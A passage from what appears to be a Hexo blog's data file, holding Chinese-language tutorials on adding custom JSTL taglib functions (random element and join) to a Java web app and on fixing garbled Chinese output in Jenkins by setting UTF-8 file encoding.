class=\"keyword\">if</span> (values == <span class=\"keyword\">null</span>)</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.EMPTY;</div><div class=\"line\">    <span class=\"keyword\">if</span> (values <span class=\"keyword\">instanceof</span> Collection&lt;?&gt;)</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.join((Collection&lt;?&gt;) values, seperator);</div><div class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (values <span class=\"keyword\">instanceof</span> Object[])</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.join((Object[]) values, seperator);</div><div class=\"line\">    <span class=\"keyword\">else</span></div><div class=\"line\">      <span class=\"keyword\">return</span> values.toString();</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"comment\">/**</span></div><div class=\"line\">   * get element from elementes by random</div><div class=\"line\">   * </div><div class=\"line\">   * <span class=\"doctag\">@param</span> elements</div><div class=\"line\">   * <span class=\"doctag\">@return</span></div><div class=\"line\">   */</div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">randomElement</span><span class=\"params\">(String[] elements)</span> </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (ArrayUtils.isEmpty(elements)) &#123;</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.EMPTY;</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">int</span> index = <span class=\"keyword\">new</span> Random().nextInt(elements.length);</div><div class=\"line\">    <span class=\"keyword\">return</span> CollectionUtils.get(elements, index).toString();</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<a id=\"more\"></a>\n<h2 id=\"二、创建taglib-fn-ext-tld\"><a href=\"#二、创建taglib-fn-ext-tld\" class=\"headerlink\" title=\"二、创建taglib fn-ext.tld\"></a>二、创建taglib fn-ext.tld</h2><p>放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld</p>\n<p>参考fn.tld内容修改：</p>\n<ol>\n<li>short-name改为我们自己的命令空间fnExt。</li>\n<li>uri：<a href=\"http://demo.martinye.com/jsp/jstl/functions-ext\" target=\"_blank\" rel=\"external\">http://demo.martinye.com/jsp/jstl/functions-ext</a></li>\n<li>定义functions，主要修改name, function-class, function-signature</li>\n</ol>\n<p>修改后的完整tld内容如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;</div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">taglib</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://java.sun.com/xml/ns/j2ee\"</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span></span></div><div class=\"line\">  <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"</span></div><div class=\"line\">  <span class=\"attr\">version</span>=<span class=\"string\">\"2.0\"</span>&gt;</div><div class=\"line\"></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>JSTL 1.1 functions ext library<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">display-name</span>&gt;</span>JSTL functions ext<span class=\"tag\">&lt;/<span class=\"name\">display-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">tlib-version</span>&gt;</span>1.1<span class=\"tag\">&lt;/<span class=\"name\">tlib-version</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">short-name</span>&gt;</span>fnExt<span class=\"tag\">&lt;/<span class=\"name\">short-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">uri</span>&gt;</span>http://demo.martinye.com/jsp/jstl/functions-ext<span class=\"tag\">&lt;/<span class=\"name\">uri</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">function</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">      get element from elementes by random</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>randomElement<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-class</span>&gt;</span>com.martinye.demo.util.taglib.FunctionsExt<span class=\"tag\">&lt;/<span class=\"name\">function-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-signature</span>&gt;</span>java.lang.String randomElement(java.lang.String[])<span class=\"tag\">&lt;/<span class=\"name\">function-signature</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">      &amp;lt;c:if test=\"$&#123;fnExt:randomElement(elements)&#125;\"&gt;</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">function</span>&gt;</span></div><div class=\"line\">  </div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">function</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">      Joins all elements of a collection into a string.</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>join<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-class</span>&gt;</span>com.martinye.demo.util.taglib.FunctionsExt<span class=\"tag\">&lt;/<span class=\"name\">function-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-signature</span>&gt;</span>java.lang.String join(java.lang.Object, java.lang.String)<span class=\"tag\">&lt;/<span class=\"name\">function-signature</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">      $&#123;fnExt:join(collection, \";\")&#125;</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">function</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">taglib</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"相关说明\"><a href=\"#相关说明\" class=\"headerlink\" title=\"相关说明\"></a>相关说明</h3><ol>\n<li><p>函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符<br>实际操作过程中，遇到不允许包含字符：<code>-</code>。<br>例如：matinye-fn或者fn-ext这样的prefix都是不对的。<br><strong>注</strong>：有待考证。</p>\n</li>\n<li><p>short-name, uri都要唯一。</p>\n</li>\n<li><p>当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。<br>例如：join(array)，join(array, String)不能都同时定义在taglib中。</p>\n</li>\n<li><p>不允许使用java.util.Collection类型作为参数，使用array或者Object代替。<br><strong>注</strong>：有待考证。</p>\n</li>\n</ol>\n<h2 id=\"三、web-xml配置taglib\"><a href=\"#三、web-xml配置taglib\" class=\"headerlink\" title=\"三、web.xml配置taglib\"></a>三、web.xml配置taglib</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">jsp-config</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">taglib</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">taglib-uri</span>&gt;</span>http://demo.martinye.com/jsp/jstl/functions-ext<span class=\"tag\">&lt;/<span class=\"name\">taglib-uri</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">taglib-location</span>&gt;</span>/WEB-INF/taglib/fn-ext.tld<span class=\"tag\">&lt;/<span class=\"name\">taglib-location</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">taglib</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">jsp-config</span>&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"四、使用taglib\"><a href=\"#四、使用taglib\" class=\"headerlink\" title=\"四、使用taglib\"></a>四、使用taglib</h2><ol>\n<li><p>jsp页面定义</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%@</span> <span class=\"attr\">taglib</span> <span class=\"attr\">uri</span>=<span class=\"string\">\"http://demo.martinye.com/jsp/jstl/functions-ext\"</span> <span class=\"attr\">prefix</span>=<span class=\"string\">\"fnExt\"</span>%&gt;</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>页面使用</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$&#123;fnExt:join(cdnServers, \" \") &#125;<span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://$&#123;fnExt:randomElement(cdnServerArr) &#125;/resources/img/logo.png\"</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></div></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\" target=\"_blank\" rel=\"external\">Taglib in Java: tag with array parameter</a></p>\n","excerpt":"<p><img src=\"/asserts/images/logo/javaee.png\" class=\"img-logo img-center\" /></p>\n<h2 id=\"一、扩展函数库\"><a href=\"#一、扩展函数库\" class=\"headerlink\" title=\"一、扩展函数库\"></a>一、扩展函数库</h2><p>在taglib函数类中添加需要的函数randomElement、join等。<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">/**</div><div class=\"line\"> * <span class=\"doctag\">@description</span> JSTL function ext</div><div class=\"line\"> * </div><div class=\"line\"> * <span class=\"doctag\">@author</span> yeshaoting</div><div class=\"line\"> * <span class=\"doctag\">@date</span> 2015-06-29 14:52:57</div><div class=\"line\"> */</span></div><div class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">FunctionsExt</span> <span class=\"keyword\">extends</span> <span class=\"title\">Functions</span> </span>&#123;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"comment\">/**</div><div class=\"line\">   * &lt;pre&gt;</div><div class=\"line\">   * jstl's fn:join only works with String[]. This one is more general.</div><div class=\"line\">   * </div><div class=\"line\">   * usage: $&#123;nc:join(values, \", \")&#125;</div><div class=\"line\">   * <span class=\"doctag\">@see</span> http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter</div><div class=\"line\">   * &lt;/pre&gt;</div><div class=\"line\">   */</span></div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">join</span><span class=\"params\">(Object values, String seperator)</span> </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (values == <span class=\"keyword\">null</span>)</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.EMPTY;</div><div class=\"line\">    <span class=\"keyword\">if</span> (values <span class=\"keyword\">instanceof</span> Collection&lt;?&gt;)</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.join((Collection&lt;?&gt;) values, seperator);</div><div class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (values <span class=\"keyword\">instanceof</span> Object[])</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.join((Object[]) values, seperator);</div><div class=\"line\">    <span class=\"keyword\">else</span></div><div class=\"line\">      <span class=\"keyword\">return</span> values.toString();</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">  <span class=\"comment\">/**</div><div class=\"line\">   * get element from elementes by random</div><div class=\"line\">   * </div><div class=\"line\">   * <span class=\"doctag\">@param</span> elements</div><div class=\"line\">   * <span class=\"doctag\">@return</span></div><div class=\"line\">   */</span></div><div class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">randomElement</span><span class=\"params\">(String[] elements)</span> </span>&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (ArrayUtils.isEmpty(elements)) &#123;</div><div class=\"line\">      <span class=\"keyword\">return</span> StringUtils.EMPTY;</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">int</span> index = <span class=\"keyword\">new</span> Random().nextInt(elements.length);</div><div class=\"line\">    <span class=\"keyword\">return</span> CollectionUtils.get(elements, index).toString();</div><div class=\"line\">  &#125;</div><div class=\"line\">  </div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>","more":"<h2 id=\"二、创建taglib-fn-ext-tld\"><a href=\"#二、创建taglib-fn-ext-tld\" class=\"headerlink\" title=\"二、创建taglib fn-ext.tld\"></a>二、创建taglib fn-ext.tld</h2><p>放置文件位置：/martinye-demo-spring-web/src/main/webapp/WEB-INF/taglib/fn-ext.tld</p>\n<p>参考fn.tld内容修改：</p>\n<ol>\n<li>short-name改为我们自己的命令空间fnExt。</li>\n<li>uri：<a href=\"http://demo.martinye.com/jsp/jstl/functions-ext\">http://demo.martinye.com/jsp/jstl/functions-ext</a></li>\n<li>定义functions，主要修改name, function-class, function-signature</li>\n</ol>\n<p>修改后的完整tld内容如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;</div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">taglib</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"http://java.sun.com/xml/ns/j2ee\"</span> <span class=\"attr\">xmlns:xsi</span>=<span class=\"string\">\"http://www.w3.org/2001/XMLSchema-instance\"</span></div><div class=\"line\">  <span class=\"attr\">xsi:schemaLocation</span>=<span class=\"string\">\"http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd\"</span></div><div class=\"line\">  <span class=\"attr\">version</span>=<span class=\"string\">\"2.0\"</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span>JSTL 1.1 functions ext library<span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">display-name</span>&gt;</span>JSTL functions ext<span class=\"tag\">&lt;/<span class=\"name\">display-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">tlib-version</span>&gt;</span>1.1<span class=\"tag\">&lt;/<span class=\"name\">tlib-version</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">short-name</span>&gt;</span>fnExt<span class=\"tag\">&lt;/<span class=\"name\">short-name</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">uri</span>&gt;</span>http://demo.martinye.com/jsp/jstl/functions-ext<span class=\"tag\">&lt;/<span class=\"name\">uri</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">function</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">      get element from elementes by random</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>randomElement<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-class</span>&gt;</span>com.martinye.demo.util.taglib.FunctionsExt<span class=\"tag\">&lt;/<span class=\"name\">function-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-signature</span>&gt;</span>java.lang.String randomElement(java.lang.String[])<span class=\"tag\">&lt;/<span class=\"name\">function-signature</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">      &amp;lt;c:if test=\"$&#123;fnExt:randomElement(elements)&#125;\"&gt;</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">function</span>&gt;</span></div><div class=\"line\">  </div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">function</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">      Joins all elements of a collection into a string.</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">description</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>join<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-class</span>&gt;</span>com.martinye.demo.util.taglib.FunctionsExt<span class=\"tag\">&lt;/<span class=\"name\">function-class</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">function-signature</span>&gt;</span>java.lang.String join(java.lang.Object, java.lang.String)<span class=\"tag\">&lt;/<span class=\"name\">function-signature</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">      $&#123;fnExt:join(collection, \";\")&#125;</div><div class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">example</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">function</span>&gt;</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">taglib</span>&gt;</span></div></pre></td></tr></table></figure></p>\n<h3 id=\"相关说明\"><a href=\"#相关说明\" class=\"headerlink\" title=\"相关说明\"></a>相关说明</h3><ol>\n<li><p>函数式taglib prefix不允许包含特殊字符，标签类taglib可以包含部分特殊字符<br>实际操作过程中，遇到不允许包含字符：<code>-</code>。<br>例如：matinye-fn或者fn-ext这样的prefix都是不对的。<br><strong>注</strong>：有待考证。</p>\n</li>\n<li><p>short-name, uri都要唯一。</p>\n</li>\n<li><p>当前命令空间fnExt下所有的函数名都不允许重复，即便是重载函数。<br>例如：join(array)，join(array, String)不能都同时定义在taglib中。</p>\n</li>\n<li><p>不允许使用java.util.Collection类型作为参数，使用array或者Object代替。<br><strong>注</strong>：有待考证。</p>\n</li>\n</ol>\n<h2 id=\"三、web-xml配置taglib\"><a href=\"#三、web-xml配置taglib\" class=\"headerlink\" title=\"三、web.xml配置taglib\"></a>三、web.xml配置taglib</h2><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">jsp-config</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">taglib</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">taglib-uri</span>&gt;</span>http://demo.martinye.com/jsp/jstl/functions-ext<span class=\"tag\">&lt;/<span class=\"name\">taglib-uri</span>&gt;</span></div><div class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">taglib-location</span>&gt;</span>/WEB-INF/taglib/fn-ext.tld<span class=\"tag\">&lt;/<span class=\"name\">taglib-location</span>&gt;</span></div><div class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">taglib</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">jsp-config</span>&gt;</span></div></pre></td></tr></table></figure>\n<h2 id=\"四、使用taglib\"><a href=\"#四、使用taglib\" class=\"headerlink\" title=\"四、使用taglib\"></a>四、使用taglib</h2><ol>\n<li><p>jsp页面定义</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">%@</span> <span class=\"attr\">taglib</span> <span class=\"attr\">uri</span>=<span class=\"string\">\"http://demo.martinye.com/jsp/jstl/functions-ext\"</span> <span class=\"attr\">prefix</span>=<span class=\"string\">\"fnExt\"</span>%&gt;</span></div></pre></td></tr></table></figure>\n</li>\n<li><p>页面使用</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\">$&#123;fnExt:join(cdnServers, \" \") &#125;<span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">\"http://$&#123;fnExt:randomElement(cdnServerArr) &#125;/resources/img/logo.png\"</span> /&gt;</span><span class=\"tag\">&lt;<span class=\"name\">br</span>/&gt;</span></div></pre></td></tr></table></figure>\n</li>\n</ol>\n<h2 id=\"五、参考文档\"><a href=\"#五、参考文档\" class=\"headerlink\" title=\"五、参考文档\"></a>五、参考文档</h2><p><a href=\"http://stackoverflow.com/questions/3886211/taglib-in-java-tag-with-array-parameter\">Taglib in Java: tag with array parameter</a></p>"},{"title":"jenkins中文乱码与服务启动","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 问题描述\n项目构建**最新修改记录**中文乱码。\n\n\n## 问题查看与分析\n首先，查看jenkins管理界面的**系统属性**功能。\n对应URL地址为：http://jenkins.go.sohuno.com/systemInfo\n\n可以看到jenkins启动环境变量file.encoding值为默认的**ISO-8859-1**(Latin-1字符集)。\n不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：[Jenkins控制台中乱码问题][^1])\n\n\n## 问题解决\n当前jenkins启动命令为：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20\n```\n\n在启动jenkins时，需要额外添加参数**file.encoding**，并设置其参数值为UTF-8。\n修改后的启动命令如下：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8\n```\n\n\n### 扩展说明\n由jenkins启动命令可看出：\n\n1. jenkins安装目录\n/var/lib/jenkins\n\n2. jenkins服务部署代码\n/usr/lib/jenkins/jenkins.war\n\n3. 运行日志\n/var/log/jenkins/jenkins.log\n\n4. jenkins代码部署位置\n/var/cache/jenkins/war\n\n5. jenkins服务端口\nhttp: 8080\najp13: 8009\n\n6. jenkins servlet容器\njenkins服务运行在winstone servlet容器，类似于tomcat, jetty等。\njenkins命令启动接收的参数`--logfile`, `--webroot`, `--httpPort`, `--ajp13Port`等都是winstone的。\n另外，查看了webroot参数对应的目录，发现目录包含类库**winstone.jar**，也可知jenkins可能是放在winstone容器里运行的。\n\n关于winstone可参考：[Winstone Servlet Container v0.9.10][^6]\n\n\n\n[^1]: http://blog.csdn.net/hunterno4/article/details/38424715\n[^2]: http://lee2013.iteye.com/blog/2108612\n[^3]: http://zhidao.baidu.com/question/177248555728533364.html\n[^4]: http://lee2013.iteye.com/blog/2108612\n[^5]: http://www.xuebuyuan.com/2108588.html\n[^6]: http://winstone.sourceforge.net/\n\n","source":"_posts/article/jenkins/jenkins中文乱码与服务启动.md","raw":"categories:\n  - 持续集成\ntags:\n  - jenkins\n  - issue\ntitle: jenkins中文乱码与服务启动\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/jenkins.png\" class=\"img-logo img-center\" />\n\n\n## 问题描述\n项目构建**最新修改记录**中文乱码。\n\n\n## 问题查看与分析\n首先，查看jenkins管理界面的**系统属性**功能。\n对应URL地址为：http://jenkins.go.sohuno.com/systemInfo\n\n可以看到jenkins启动环境变量file.encoding值为默认的**ISO-8859-1**(Latin-1字符集)。\n不希望jenkins乱码，需要设置其编码方式为UTF-8。(参考：[Jenkins控制台中乱码问题][^1])\n\n\n## 问题解决\n当前jenkins启动命令为：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20\n```\n\n在启动jenkins时，需要额外添加参数**file.encoding**，并设置其参数值为UTF-8。\n修改后的启动命令如下：\n``` shell\njava -Djava.awt.headless=true -DJENKINS_HOME=/var/lib/jenkins -jar /usr/lib/jenkins/jenkins.war --logfile=/var/log/jenkins/jenkins.log --webroot=/var/cache/jenkins/war --httpPort=8080 --ajp13Port=8009 --debug=5 --handlerCountMax=100 --handlerCountMaxIdle=20 -Dfile.encoding=UTF-8\n```\n\n\n### 扩展说明\n由jenkins启动命令可看出：\n\n1. jenkins安装目录\n/var/lib/jenkins\n\n2. jenkins服务部署代码\n/usr/lib/jenkins/jenkins.war\n\n3. 运行日志\n/var/log/jenkins/jenkins.log\n\n4. 